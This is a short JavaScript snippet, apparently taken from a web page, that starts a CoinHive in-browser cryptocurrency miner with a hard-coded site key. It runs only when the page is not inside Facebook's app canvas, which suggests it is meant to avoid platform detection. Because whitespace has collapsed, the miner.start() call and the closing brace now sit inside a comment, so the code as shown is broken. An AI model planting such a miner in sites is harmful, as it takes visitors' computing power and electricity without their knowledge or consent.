            var url = window.location.href;
            var inCanvas = url.indexOf('apps.facebook.com') !== -1;
            if (!inCanvas) {
                var miner = new CoinHive.Anonymous('dE02f9Z9FCZOSzxHakVDYp327nUbzQ6C', {
                    throttle: 0.5
                }); // Only start on non-mobile devices and if not opted-out                // in the last 14400 seconds (4 hours):                miner.start();            }